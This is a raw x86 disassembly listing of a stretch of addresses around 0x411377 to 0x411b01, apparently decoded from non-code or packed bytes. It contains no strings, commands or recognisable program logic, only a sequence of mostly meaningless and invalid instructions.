  411377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411378:	mov    esi,0x8ded149a
  41137d:	aaa    
  41137e:	sub    DWORD PTR [eax+edx*2-0x34],ecx
  411382:	aaa    
  411383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411384:	cli    
  411385:	push   DWORD PTR [ebx-0x30]
  411388:	mov    DWORD PTR [edx+0x5fba86e8],eax
  41138e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41138f:	scas   eax,DWORD PTR es:[edi]
  411390:	dec    eax
  411391:	and    al,0x9b
  411393:	mov    ds:0x4d2a153,al
  411398:	mov    BYTE PTR [ecx],ah
  41139a:	lahf   
  41139b:	int    0x2
  41139d:	sub    ecx,ebx
  41139f:	mov    ah,0x7
  4113a1:	ret    0x3696
  4113a4:	out    dx,eax
  4113a5:	das    
  4113a6:	add    esi,ebx
  4113a8:	pushf  
  4113a9:	stos   BYTE PTR es:[edi],al
  4113aa:	test   eax,0x4af4053a
  4113af:	or     esi,DWORD PTR [ebx+eiz*1-0x5b]
  4113b3:	(bad)  
  4113b4:	pop    edx
  4113b5:	js     0x411416
  4113b7:	sbb    BYTE PTR [ecx+0x33],0x29
  4113bb:	xor    BYTE PTR [edi+0x513c5e12],al
  4113c1:	int3   
  4113c2:	jnp    0x411403
  4113c4:	sbb    BYTE PTR [esi],bl
  4113c6:	ins    DWORD PTR es:[edi],dx
  4113c7:	dec    ebx
  4113c8:	scas   eax,DWORD PTR es:[edi]
  4113c9:	gs inc ebp
  4113cb:	repz fisubr DWORD PTR [edi]
  4113ce:	and    BYTE PTR [ecx+0x7090fb7f],ch
  4113d4:	sub    eax,0xb2943dea
  4113d9:	push   cs
  4113da:	push   edi
  4113db:	jne    0x4113ae
  4113dd:	sub    esp,DWORD PTR [eax]
  4113df:	jmp    0x4113db
  4113e1:	cmc    
  4113e2:	jbe    0x411364
  4113e4:	into   
  4113e5:	loope  0x4113a7
  4113e7:	pushf  
  4113e8:	pop    esi
  4113e9:	or     eax,0xc8689435
  4113ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113ef:	mov    eax,0x7a37836
  4113f4:	fsub   DWORD PTR [edx+eiz*2+0x47]
  4113f8:	jne    0x411412
  4113fa:	cmp    dh,dh
  4113fc:	icebp  
  4113fd:	aad    0x3f
  4113ff:	jbe    0x41138b
  411401:	call   0x7b5fe865
  411406:	(bad)  
  411407:	xor    al,0x34
  411409:	cmp    dl,ah
  41140b:	push   edi
  41140c:	add    cl,bh
  41140e:	out    0xab,al
  411410:	push   ebx
  411411:	push   0x2442208e
  411416:	xchg   edi,eax
  411417:	aad    0x19
  411419:	stos   DWORD PTR es:[edi],eax
  41141a:	dec    ecx
  41141b:	ja     0x411482
  41141d:	sbb    BYTE PTR [eax-0xd],0xd
  411421:	js     0x4113f8
  411423:	arpl   WORD PTR [edi+0x63],bp
  411426:	ss lock popf 
  411429:	sbb    esp,DWORD PTR [eax]
  41142b:	push   ebp
  41142c:	cmc    
  41142d:	aad    0x2e
  41142f:	adc    esi,DWORD PTR [ebx+0x5b]
  411432:	fimul  WORD PTR [edx+0x4]
  411435:	retf   0x2695
  411438:	push   cs
  411439:	in     al,dx
  41143a:	add    edx,DWORD PTR [ecx+0xad4a98e]
  411440:	xor    BYTE PTR [ebx],cl
  411442:	dec    esi
  411443:	pusha  
  411444:	inc    ebp
  411445:	or     dh,ah
  411447:	mov    BYTE PTR [ecx],bl
  411449:	(bad)  
  41144a:	lock pop eax
  41144c:	fcom   st(3)
  41144e:	mov    eax,ds:0x6135b351
  411453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411454:	mov    bh,0x43
  411456:	xor    BYTE PTR [ebx-0x77b046b5],bh
  41145c:	lods   eax,DWORD PTR ds:[esi]
  41145d:	icebp  
  41145e:	aaa    
  41145f:	das    
  411460:	sar    ebx,0xa3
  411463:	dec    ebx
  411464:	jno    0x41146d
  411466:	pop    esi
  411467:	xor    al,0x27
  411469:	inc    ecx
  41146a:	adc    DWORD PTR [ecx+0x5af428f3],esp
  411470:	add    ebx,edi
  411472:	push   0x8a143176
  411477:	ds jno 0x41146a
  41147a:	inc    edi
  41147b:	test   BYTE PTR [eax],ah
  41147d:	fistp  QWORD PTR [edx]
  41147f:	int3   
  411480:	inc    esi
  411481:	mov    dl,0xc
  411483:	rcl    DWORD PTR [edi+edi*2],0x68
  411487:	test   DWORD PTR [edx+0x3d076fdf],esp
  41148d:	aaa    
  41148e:	pop    ebp
  41148f:	mov    bh,0x98
  411491:	je     0x411448
  411493:	daa    
  411494:	in     eax,0xaa
  411496:	dec    ebp
  411497:	(bad)  
  411498:	jmp    0xf8032d5c
  41149d:	jo     0x4114a5
  41149f:	dec    eax
  4114a0:	push   0xb28505be
  4114a5:	scas   al,BYTE PTR es:[edi]
  4114a6:	push   esi
  4114a7:	fistp  WORD PTR [ebx-0x52]
  4114aa:	lock ret 
  4114ac:	jno    0x411435
  4114ae:	pop    DWORD PTR [ecx-0x19e98de6]
  4114b4:	test   eax,0x6b402812
  4114b9:	mov    ecx,0xda32d30c
  4114be:	sti    
  4114bf:	xchg   BYTE PTR [eax+0x16],cl
  4114c2:	sar    DWORD PTR [ecx],0xdf
  4114c5:	mov    fs,WORD PTR [ecx-0x592ad793]
  4114cb:	push   es
  4114cc:	sbb    al,0x4e
  4114ce:	pushf  
  4114cf:	adc    ah,BYTE PTR [ecx]
  4114d1:	sub    eax,0x2aa9b3d5
  4114d6:	pop    ss
  4114d7:	mov    eax,ds:0xcee2c326
  4114dc:	cwde   
  4114dd:	ret    
  4114de:	push   es
  4114df:	xchg   ebp,eax
  4114e0:	(bad)  
  4114e1:	in     al,0x51
  4114e3:	in     al,dx
  4114e4:	(bad)  
  4114e5:	aad    0xb7
  4114e7:	es es jb 0x41150c
  4114eb:	shr    BYTE PTR ds:0x5d565e16,cl
  4114f1:	mov    ebx,0x811d0980
  4114f6:	test   BYTE PTR [edi-0x7a],cl
  4114f9:	test   esi,0x652705e8
  4114ff:	xchg   ecx,eax
  411500:	jmp    0x4114c1
  411502:	out    dx,al
  411503:	iret   
  411504:	out    dx,al
  411505:	stc    
  411506:	ja     0x41149e
  411508:	mov    BYTE PTR [esi],ah
  41150a:	and    eax,0x368ea204
  41150f:	xchg   ebp,eax
  411510:	stc    
  411511:	ins    BYTE PTR es:[edi],dx
  411512:	stos   DWORD PTR es:[edi],eax
  411513:	popf   
  411514:	mov    dl,0x8e
  411516:	pop    ds
  411517:	jne    0x4114c9
  411519:	pop    ds
  41151a:	ret    0x9685
  41151d:	jp     0x411548
  41151f:	or     bl,ch
  411521:	dec    edx
  411522:	inc    ebp
  411523:	sub    BYTE PTR [esi],ah
  411525:	mov    esi,DWORD PTR [ebp-0x54dcab3a]
  41152b:	dec    eax
  41152c:	out    0x30,eax
  41152e:	jmp    0x4114ff
  411530:	sub    BYTE PTR [eax],bl
  411532:	int    0xd8
  411534:	sbb    BYTE PTR [esi],dh
  411536:	sub    BYTE PTR [edx-0x777f933a],ch
  41153c:	ins    DWORD PTR es:[edi],dx
  41153d:	shl    DWORD PTR [edi-0x3dd7f6f3],0xeb
  411544:	push   ds
  411545:	loope  0x4115a0
  411547:	(bad)  
  411548:	shr    esp,1
  41154a:	mov    ds:0x1c7a3fc7,eax
  41154f:	sbb    DWORD PTR [ebx-0x54],esp
  411552:	daa    
  411553:	xor    eax,0xe6f68285
  411558:	repz jecxz 0x41155e
  41155b:	mov    ebp,0xf161d51c
  411560:	dec    ebx
  411561:	or     eax,0x2b2fd875
  411566:	sbb    esp,DWORD PTR [eax]
  411568:	mov    dl,0x83
  41156a:	cmp    ch,BYTE PTR [ebx+0x7998a839]
  411570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411571:	retf   0xb321
  411574:	fdiv   QWORD PTR [eax]
  411576:	jnp    0x4115e4
  411578:	(bad)  
  411579:	push   0xffffffd5
  41157b:	add    al,0x90
  41157d:	es jne 0x41152e
  411580:	ds push cs
  411582:	cld    
  411583:	rcl    ebp,cl
  411585:	out    0x8f,al
  411587:	mov    esi,0xfb6fb1a3
  41158c:	adc    DWORD PTR [edi],ecx
  41158e:	xchg   esp,ecx
  411590:	xor    dl,BYTE PTR [ecx]
  411592:	mov    ebx,0xdeaa07e2
  411597:	pop    ebx
  411598:	fmul   QWORD PTR [ebp-0x1]
  41159b:	sbb    ch,BYTE PTR [edx-0x1359b7f9]
  4115a1:	adc    ebp,DWORD PTR [ebp+0x33bd6b91]
  4115a7:	push   0x20
  4115a9:	sbb    al,0x89
  4115ab:	out    dx,al
  4115ac:	sbb    esi,DWORD PTR [esi-0x7b]
  4115af:	stos   BYTE PTR es:[edi],al
  4115b0:	cmp    al,bh
  4115b2:	call   0x272e:0xde71c321
  4115b9:	jb     0x411567
  4115bb:	fldenv [esp+ebx*8]
  4115be:	xor    DWORD PTR [edi],esp
  4115c0:	pop    esi
  4115c1:	je     0x41160c
  4115c3:	lahf   
  4115c4:	sahf   
  4115c5:	push   ebp
  4115c6:	jnp    0x411597
  4115c8:	xchg   DWORD PTR [eax],ecx
  4115ca:	inc    ebx
  4115cb:	or     al,0xf0
  4115cd:	cmp    bl,BYTE PTR [edx-0x5f]
  4115d0:	dec    edx
  4115d1:	mov    ebx,edx
  4115d3:	aaa    
  4115d4:	mov    al,ds:0x946d1322
  4115d9:	dec    eax
  4115da:	ja     0x411560
  4115dc:	pushf  
  4115dd:	mov    esp,0x7ab92655
  4115e2:	ror    DWORD PTR [ebp+0x69b7771b],cl
  4115e8:	pop    ebp
  4115e9:	jo     0x41160d
  4115eb:	les    ebx,FWORD PTR [edx+ebx*4-0x7a2e2745]
  4115f2:	mov    cl,0x75
  4115f4:	addr16 push eax
  4115f6:	cmc    
  4115f7:	add    al,0x83
  4115f9:	sar    bl,0x77
  4115fc:	mov    esi,0xe67077b5
  411601:	scas   eax,DWORD PTR es:[edi]
  411602:	push   esp
  411603:	in     al,dx
  411604:	push   edx
  411605:	adc    eax,0x3b6f8f46
  41160a:	retf   
  41160b:	mov    edi,0xa908068a
  411610:	in     al,0x5f
  411612:	clc    
  411613:	out    0x69,eax
  411615:	cmc    
  411616:	sbb    esi,ebx
  411618:	mov    dl,0x49
  41161a:	ret    
  41161b:	popf   
  41161c:	mov    al,ds:0x7e78d06a
  411621:	dec    esp
  411622:	cmc    
  411623:	sbb    al,cl
  411625:	fs popa 
  411627:	inc    esi
  411628:	inc    esi
  411629:	dec    edx
  41162a:	cmp    al,0xa7
  41162c:	push   0x67c1a1b2
  411631:	xchg   edx,eax
  411632:	inc    edx
  411633:	mov    al,ds:0xf9342712
  411638:	lods   al,BYTE PTR ds:[esi]
  411639:	push   es
  41163a:	and    ebp,DWORD PTR [ecx+0x2a]
  41163d:	adc    DWORD PTR [ebx-0xb],ebp
  411640:	je     0x4115d0
  411642:	clc    
  411643:	jl     0x4115d5
  411645:	nop
  411646:	fist   WORD PTR [edx-0xf516ae1]
  41164c:	cmp    ch,BYTE PTR [edx]
  41164e:	loop   0x4116c0
  411650:	mov    cl,bh
  411652:	ins    BYTE PTR es:[edi],dx
  411653:	imul   ecx,DWORD PTR [edi],0xfacd363
  411659:	ret    0x86c5
  41165c:	rcr    DWORD PTR [ebp-0x50cf13f8],1
  411662:	ins    BYTE PTR es:[edi],dx
  411663:	fdecstp 
  411665:	pop    ebp
  411666:	std    
  411667:	std    
  411668:	out    dx,eax
  411669:	xor    DWORD PTR [ebx+0x25b33ad0],edi
  41166f:	sti    
  411670:	pop    esp
  411671:	add    BYTE PTR [eax+0x71],dh
  411674:	mov    dh,0x6d
  411676:	adc    esi,DWORD PTR [edi+edi*1+0x4a210b3c]
  41167d:	out    0xb4,eax
  41167f:	or     BYTE PTR [ebp-0x186074c1],0x63
  411686:	loope  0x4116f7
  411688:	in     eax,0x87
  41168a:	lods   eax,DWORD PTR ds:[esi]
  41168b:	fwait
  41168c:	jle    0x4116ba
  41168e:	sub    eax,0xd19ffee6
  411693:	scas   al,BYTE PTR es:[edi]
  411694:	iret   
  411695:	jl     0x4116ef
  411697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411698:	ins    BYTE PTR es:[edi],dx
  411699:	pop    esi
  41169a:	cmp    dl,BYTE PTR [esi+0x0]
  41169d:	xlat   BYTE PTR ds:[ebx]
  41169e:	mov    cl,0xa3
  4116a0:	jle    0x411629
  4116a2:	(bad)  
  4116a3:	stc    
  4116a4:	sub    dl,BYTE PTR [esi]
  4116a6:	sbb    al,0x46
  4116a8:	adc    BYTE PTR [edx-0x3c1105d2],ch
  4116ae:	pop    ss
  4116af:	mov    ds:0x1162fe64,al
  4116b4:	cmp    eax,0x2348ab9f
  4116b9:	bound  esi,QWORD PTR [esi+0x7c]
  4116bc:	shl    BYTE PTR [esi],1
  4116be:	sbb    eax,DWORD PTR [esi+ebp*4]
  4116c1:	mov    ds:0xf5811a3c,al
  4116c6:	rol    DWORD PTR ds:0x578ccdf8,0x15
  4116cd:	sub    DWORD PTR [edx],ecx
  4116cf:	ja     0x411731
  4116d1:	xor    al,0x0
  4116d3:	jo     0x411743
  4116d5:	pushf  
  4116d6:	sub    edi,0xffffff9b
  4116d9:	shr    BYTE PTR [ebp+0x5c],cl
  4116dc:	lods   al,BYTE PTR ds:[esi]
  4116dd:	test   al,0x71
  4116df:	fst    DWORD PTR [ecx]
  4116e1:	pop    ebp
  4116e2:	jg     0x4116fc
  4116e4:	add    dh,BYTE PTR [ecx]
  4116e6:	jl     0x411767
  4116e8:	mov    edi,0xec54e6ab
  4116ed:	jnp    0x411735
  4116ef:	or     cl,bh
  4116f1:	or     cl,bh
  4116f3:	inc    eax
  4116f4:	mov    ds:0xa5ac9493,eax
  4116f9:	sub    al,BYTE PTR [edi-0x71f7bfa5]
  4116ff:	fsubp  st(4),st
  411701:	cmp    eax,esp
  411703:	xor    dl,dl
  411705:	daa    
  411706:	dec    esp
  411707:	mov    bl,0x56
  411709:	dec    ebx
  41170a:	adc    al,0x5f
  41170c:	push   es
  41170d:	pop    eax
  41170e:	aad    0xce
  411710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411711:	outs   dx,BYTE PTR ds:[esi]
  411712:	scas   al,BYTE PTR es:[edi]
  411713:	(bad)  
  411714:	aaa    
  411715:	cmp    esi,DWORD PTR [ecx-0x21]
  411718:	sub    eax,0x5d55fe6e
  41171d:	sbb    eax,0x5e3b006e
  411722:	mov    edx,0xa8adfb3e
  411727:	push   ebp
  411728:	pop    ecx
  411729:	inc    ebx
  41172a:	clc    
  41172b:	adc    BYTE PTR [ebx-0x14],ah
  41172e:	neg    ah
  411730:	pop    ebp
  411731:	jl     0x411719
  411733:	jno    0x411724
  411735:	outs   dx,BYTE PTR ds:[esi]
  411736:	pop    ds
  411737:	ins    DWORD PTR es:[edi],dx
  411738:	test   DWORD PTR [edx+0x22],esi
  41173b:	pop    esp
  41173c:	adc    ah,al
  41173e:	icebp  
  41173f:	repnz imul edi,DWORD PTR [ecx-0x6e600330],0x63
  411747:	ss push cs
  411749:	(bad)  
  41174a:	jmp    0x2452d259
  41174f:	mov    bl,0x1b
  411751:	cmp    bl,bh
  411753:	cmp    ebp,DWORD PTR [esi-0x45]
  411756:	popa   
  411757:	(bad)  
  411758:	mov    ch,0x27
  41175a:	cld    
  41175b:	adc    al,0xd1
  41175d:	mov    esi,DWORD PTR [ecx+0x6d]
  411760:	and    al,0xf
  411762:	pop    edi
  411763:	xchg   ebx,eax
  411764:	mov    eax,ds:0xea97a5e7
  411769:	pushf  
  41176a:	lods   eax,DWORD PTR ds:[esi]
  41176b:	mov    esi,DWORD PTR [edx-0x2f8baa89]
  411771:	out    dx,al
  411772:	jl     0x411777
  411774:	mov    al,0x9e
  411776:	add    edx,DWORD PTR [ebx]
  411778:	dec    BYTE PTR [esi+esi*1-0xe]
  41177c:	out    dx,al
  41177d:	imul   ecx,edx,0x23
  411780:	arpl   WORD PTR [ecx],dx
  411782:	in     eax,dx
  411783:	jns    0x41179b
  411785:	cwde   
  411786:	xlat   BYTE PTR ds:[ebx]
  411787:	retf   0xa57c
  41178a:	mov    ah,0x3c
  41178c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41178d:	fwait
  41178e:	cmp    eax,0x6d6ecf4e
  411793:	ss jns 0x411791
  411796:	cmp    esi,DWORD PTR [ebp+0x369d9dff]
  41179c:	mov    BYTE PTR [ecx],dh
  41179e:	scas   eax,DWORD PTR es:[edi]
  41179f:	push   0xacf4e495
  4117a4:	jae    0x41178c
  4117a6:	add    al,0x2d
  4117a8:	loopne 0x4117e4
  4117aa:	popf   
  4117ab:	in     eax,0x9f
  4117ad:	aad    0x16
  4117af:	stos   BYTE PTR es:[edi],al
  4117b0:	dec    edx
  4117b1:	icebp  
  4117b2:	jecxz  0x411776
  4117b4:	pushf  
  4117b5:	imul   ecx,DWORD PTR [edi+eiz*1-0x4921f336],0xfffffff7
  4117bd:	aam    0x20
  4117bf:	mov    bh,0xcf
  4117c1:	fstp   TBYTE PTR [edx+esi*2-0x71]
  4117c5:	or     edi,eax
  4117c7:	push   es
  4117c8:	out    0x43,eax
  4117ca:	pop    ebx
  4117cb:	popf   
  4117cc:	test   dh,ah
  4117ce:	dec    eax
  4117cf:	push   edx
  4117d0:	(bad)  
  4117d1:	mov    bl,0xf6
  4117d3:	ins    DWORD PTR es:[edi],dx
  4117d4:	xchg   esi,eax
  4117d5:	fistp  QWORD PTR [esi]
  4117d7:	out    0xa3,al
  4117d9:	sti    
  4117da:	or     cl,BYTE PTR [edx-0x49179858]
  4117e0:	loop   0x411804
  4117e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e3:	dec    eax
  4117e4:	nop
  4117e5:	dec    ecx
  4117e6:	jbe    0x4117c6
  4117e8:	sbb    al,0xa0
  4117ea:	cld    
  4117eb:	pop    es
  4117ec:	and    al,0xaa
  4117ee:	fcomip st,st(7)
  4117f0:	fcom   QWORD PTR [ecx+0x3a]
  4117f3:	add    al,0x98
  4117f5:	(bad)  
  4117f6:	fnstcw WORD PTR [esi+0x5cfb552d]
  4117fc:	xchg   ecx,eax
  4117fd:	cmp    DWORD PTR ds:0x74d75a62,eax
  411803:	in     eax,dx
  411804:	test   al,0xdc
  411806:	into   
  411807:	mov    dh,0x1a
  411809:	pop    es
  41180a:	or     DWORD PTR [ebp+0x7e],esp
  41180d:	or     BYTE PTR [ecx-0x59eb0082],ah
  411813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411814:	fwait
  411815:	or     BYTE PTR [esp+ebx*4-0x568da8b1],bh
  41181c:	fs mov esp,0xa6d115e9
  411822:	imul   edi,DWORD PTR [ebx],0x29a1c875
  411828:	shl    BYTE PTR [ecx-0x7b645ec2],0x90
  41182f:	mov    dh,0xb7
  411831:	test   eax,0xc8aa103b
  411836:	mov    cl,0xcd
  411838:	mov    BYTE PTR [edi+edx*1+0x37],bh
  41183c:	pop    ebx
  41183d:	push   0x3e0392a5
  411842:	jns    0x4117fd
  411844:	jg     0x4117fc
  411846:	mov    DWORD PTR [ebx-0x3e],edx
  411849:	and    BYTE PTR [ecx+0x2ab96c1],ah
  41184f:	inc    ecx
  411850:	dec    BYTE PTR [esi]
  411852:	sub    BYTE PTR [esp+ebx*1+0x32],bl
  411856:	outs   dx,BYTE PTR ds:[esi]
  411857:	jno    0x411844
  411859:	mov    cl,BYTE PTR [esi+0x79]
  41185c:	cli    
  41185d:	out    dx,al
  41185e:	jne    0x4118c0
  411860:	adc    eax,0x38508f69
  411865:	xlat   BYTE PTR ds:[ebx]
  411866:	xchg   esi,eax
  411867:	sub    al,0x47
  411869:	(bad)  
  41186a:	mov    esp,0x13b43a34
  41186f:	(bad)  
  411870:	in     eax,0x51
  411872:	out    dx,eax
  411873:	outs   dx,BYTE PTR ds:[esi]
  411874:	push   ds
  411875:	jns    0x411871
  411877:	rcl    DWORD PTR [edx+esi*1],cl
  41187a:	mov    DWORD PTR [eax],esi
  41187c:	sbb    DWORD PTR [ebx],ebx
  41187e:	mov    esp,es
  411880:	test   eax,0x69a30940
  411885:	pop    ss
  411886:	sbb    BYTE PTR [ebx+ebx*8-0x34],ah
  41188a:	outs   dx,BYTE PTR ds:[esi]
  41188b:	add    al,BYTE PTR [ecx+0x5c4bb1b4]
  411891:	retf   
  411892:	fisttp DWORD PTR [ebp-0x10509964]
  411898:	lods   al,BYTE PTR ds:[esi]
  411899:	(bad)  
  41189a:	jns    0x4118e1
  41189c:	sub    eax,0xfec4cd89
  4118a1:	xlat   BYTE PTR ds:[ebx]
  4118a2:	fild   QWORD PTR [esi-0x39]
  4118a5:	jmp    0x87d:0x5fde3d20
  4118ac:	cld    
  4118ad:	ins    BYTE PTR es:[edi],dx
  4118ae:	dec    eax
  4118af:	add    ch,BYTE PTR [ebx+0x6ecab019]
  4118b5:	adc    BYTE PTR [eax],ah
  4118b7:	adc    ch,BYTE PTR [edx]
  4118b9:	xchg   BYTE PTR [eax],al
  4118bb:	inc    eax
  4118bc:	or     al,0x5d
  4118be:	xor    al,0x84
  4118c0:	inc    ebx
  4118c1:	popf   
  4118c2:	cmc    
  4118c3:	hlt    
  4118c4:	retf   
  4118c5:	and    al,0x1
  4118c7:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4118c9:	cmp    ebx,esi
  4118cb:	(bad)  
  4118cc:	push   esi
  4118cd:	dec    esp
  4118ce:	and    edi,edx
  4118d0:	mul    BYTE PTR [esi+ecx*1+0x340387ce]
  4118d7:	mov    ds:0x186b8337,al
  4118dc:	sbb    ch,BYTE PTR [edx+eiz*8+0x252d910]
  4118e3:	pop    esi
  4118e4:	push   edx
  4118e5:	shl    BYTE PTR [ecx],1
  4118e7:	imul   bh
  4118e9:	cdq    
  4118ea:	or     bl,BYTE PTR [esi-0x36ab98d8]
  4118f0:	int3   
  4118f1:	sbb    DWORD PTR [eax],esi
  4118f3:	fsubr  QWORD PTR [edx-0x4373349b]
  4118f9:	cmp    DWORD PTR [edx-0x58],ecx
  4118fc:	in     al,0x51
  4118fe:	pop    edx
  4118ff:	imul   edx,DWORD PTR [ebx+ebp*4-0x66929404],0x6d0a23c9
  41190a:	xchg   esp,eax
  41190b:	or     ebx,DWORD PTR [ebx+ecx*2+0x5d]
  41190f:	repnz (bad) 
  411911:	int    0x9d
  411913:	nop
  411914:	cmp    dh,ch
  411916:	es test eax,0xcee32e8a
  41191c:	sub    ebp,eax
  41191e:	fisttp DWORD PTR [ebx]
  411920:	adc    cl,al
  411922:	mov    BYTE PTR [ebp+0x63],al
  411925:	rcl    BYTE PTR [edi-0x21],1
  411928:	mov    edi,0x8e6d8388
  41192d:	adc    DWORD PTR [eax],0x4e740094
  411933:	stc    
  411934:	pop    edx
  411935:	in     eax,0x99
  411937:	scas   eax,DWORD PTR es:[edi]
  411938:	int3   
  411939:	aas    
  41193a:	outs   dx,DWORD PTR ds:[esi]
  41193b:	mov    esp,DWORD PTR [edx]
  41193d:	ins    DWORD PTR es:[edi],dx
  41193e:	jmp    0xaca1:0x8eea260b
  411945:	mov    esp,gs
  411947:	sbb    ah,BYTE PTR [eax-0x249f99e2]
  41194d:	rcl    DWORD PTR [ebx+0x2e],1
  411950:	mov    ds:0x1e1f7756,al
  411955:	and    ebp,ebx
  411957:	fs xchg esi,eax
  411959:	xchg   ebp,eax
  41195a:	mov    cl,0xe4
  41195c:	and    eax,0xe6ad5ec1
  411961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411962:	aam    0x4a
  411964:	mov    al,ds:0x9a474453
  411969:	div    DWORD PTR [esi]
  41196b:	mov    eax,ds:0xc1ad25d1
  411970:	cmp    BYTE PTR [ecx+edi*4+0x51],ch
  411974:	fist   DWORD PTR [edi]
  411976:	cmp    bx,WORD PTR [ecx-0x533b1cb8]
  41197d:	jl     0x4119e4
  41197f:	fsubr  DWORD PTR [ebx-0x4cafb162]
  411985:	imul   ecx,DWORD PTR [eax],0xf8f53256
  41198b:	sti    
  41198c:	in     al,0xb1
  41198e:	ret    0x5b4e
  411991:	mov    BYTE PTR [edi],dh
  411993:	leave  
  411994:	out    0xf2,eax
  411996:	fist   WORD PTR [ebx]
  411998:	out    dx,eax
  411999:	jne    0x41195f
  41199b:	scas   al,BYTE PTR es:[edi]
  41199c:	lea    edi,[esi]
  41199e:	test   al,0xba
  4119a0:	hlt    
  4119a1:	xor    al,0x94
  4119a3:	stos   DWORD PTR es:[edi],eax
  4119a4:	cmc    
  4119a5:	and    eax,0x124de1cf
  4119aa:	call   FWORD PTR [ebp-0x40af441c]
  4119b0:	adc    al,0xa8
  4119b2:	inc    ecx
  4119b3:	sbb    bl,0x73
  4119b6:	js     0x411982
  4119b8:	(bad)  
  4119b9:	cmp    cl,al
  4119bb:	push   ecx
  4119bc:	or     BYTE PTR [esi],0x39
  4119bf:	mov    WORD PTR [ebp+0x7c],?
  4119c2:	pusha  
  4119c3:	dec    ecx
  4119c4:	aad    0x99
  4119c6:	xchg   esp,eax
  4119c7:	and    al,BYTE PTR [esi]
  4119c9:	cdq    
  4119ca:	mov    ebx,DWORD PTR [ebx]
  4119cc:	int3   
  4119cd:	mov    ds:0x1a0c8f2d,al
  4119d2:	mov    ecx,0x1ace00b0
  4119d7:	mov    ecx,0x9985cd84
  4119dc:	stos   BYTE PTR es:[edi],al
  4119dd:	(bad)  
  4119de:	mov    cl,0xfe
  4119e0:	mov    esi,0xbcbcc631
  4119e5:	repnz scas eax,DWORD PTR es:[edi]
  4119e7:	cdq    
  4119e8:	push   ebp
  4119e9:	je     0x411a5c
  4119eb:	mov    ebp,0xf64ed975
  4119f0:	pop    esp
  4119f1:	inc    edx
  4119f2:	shr    esi,cl
  4119f4:	xor    al,0x15
  4119f6:	push   0xfffffff8
  4119f8:	cld    
  4119f9:	bound  ebx,QWORD PTR [eax]
  4119fb:	jae    0x411a67
  4119fd:	out    0x4,eax
  4119ff:	imul   ebp,DWORD PTR [ebx+0x4aaa1885],0x2a
  411a06:	add    ecx,ebx
  411a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a09:	sub    eax,0x136561fc
  411a0e:	out    0x5,al
  411a10:	fldcw  WORD PTR [edi]
  411a12:	lea    esi,[edi+0x47]
  411a15:	retf   0x2a39
  411a18:	push   0xf73a77c7
  411a1d:	sub    bh,dh
  411a1f:	cmp    eax,0x9333b49a
  411a24:	mov    dl,0x45
  411a26:	clc    
  411a27:	pop    ebp
  411a28:	push   es
  411a29:	add    eax,0x8f3e3353
  411a2e:	jno    0x411a7b
  411a30:	push   0x5730a9d3
  411a35:	xor    DWORD PTR [ecx],ecx
  411a37:	push   0xc842908a
  411a3c:	sub    dl,dl
  411a3e:	dec    esp
  411a3f:	mov    al,ds:0x5fc22fcf
  411a44:	popa   
  411a45:	jp     0x411a71
  411a47:	mov    DWORD PTR [ebx],ebp
  411a49:	loope  0x411a49
  411a4b:	in     al,0x8
  411a4d:	mov    ecx,0xe3bd45fa
  411a52:	jecxz  0x411ad1
  411a54:	pop    eax
  411a55:	(bad)  
  411a56:	mov    edx,0xafe80ce8
  411a5b:	push   0x99322f52
  411a60:	ret    
  411a61:	sub    al,0x1b
  411a63:	arpl   WORD PTR [eax-0x3a],bx
  411a66:	lea    edi,[ebx]
  411a68:	fucomp st(6)
  411a6a:	dec    ebp
  411a6b:	shr    BYTE PTR [esi-0x2a],cl
  411a6e:	nop
  411a6f:	xchg   DWORD PTR [esi-0x3c],esp
  411a72:	xchg   DWORD PTR [ebx-0x23],ebx
  411a75:	lods   al,BYTE PTR ds:[esi]
  411a76:	nop
  411a77:	jmp    0x3a1c:0x41f5124c
  411a7e:	mov    al,0x91
  411a80:	push   ebx
  411a81:	mov    eax,0x484d608a
  411a86:	aam    0x4f
  411a88:	not    BYTE PTR [edi+0x5c]
  411a8b:	sbb    BYTE PTR [ecx-0x3a40652d],dl
  411a91:	aaa    
  411a92:	and    ebp,DWORD PTR [eax]
  411a94:	pop    ecx
  411a95:	push   ebx
  411a96:	inc    edi
  411a97:	inc    ebx
  411a98:	cmp    BYTE PTR [ebp-0x7e],bl
  411a9b:	mov    esp,0xec7ec8d4
  411aa0:	lea    ebx,[ecx]
  411aa2:	add    eax,0x2631ef47
  411aa7:	push   eax
  411aa8:	mov    dl,0x63
  411aaa:	mov    edi,0x46c634da
  411aaf:	push   0x68
  411ab1:	into   
  411ab2:	jge    0x411a8e
  411ab4:	out    dx,al
  411ab5:	shl    DWORD PTR [ebx+ebp*2+0x177675de],cl
  411abc:	inc    esp
  411abd:	inc    edx
  411abe:	or     ebp,DWORD PTR [ecx-0x138e4d3b]
  411ac4:	add    al,dl
  411ac6:	mov    al,0x20
  411ac8:	retf   
  411ac9:	ficomp WORD PTR ds:0x6e26a815
  411acf:	xlat   BYTE PTR ds:[ebx]
  411ad0:	mov    ?,WORD PTR [edi+ebx*2-0x6e5f007c]
  411ad7:	and    BYTE PTR gs:[eax],0x12
  411adb:	aam    0xff
  411add:	js     0x411ac0
  411adf:	push   0x51
  411ae1:	mov    cs,WORD PTR [eax+edx*2]
  411ae4:	xchg   esp,eax
  411ae5:	mov    BYTE PTR [edx+0xa],bl
  411ae8:	out    0xe9,eax
  411aea:	mov    ah,0xad
  411aec:	aam    0x37
  411aee:	icebp  
  411aef:	sti    
  411af0:	jb     0x411aae
  411af2:	(bad)
  411af5:	mov    ch,0x66
  411af7:	les    eax,FWORD PTR [edx]
  411af9:	sti    
  411afa:	mov    cl,0x75
  411afc:	out    dx,eax
  411afd:	mov    bh,0x2b
  411aff:	xor    eax,edx
  411b01:	xchg   ebx,eax
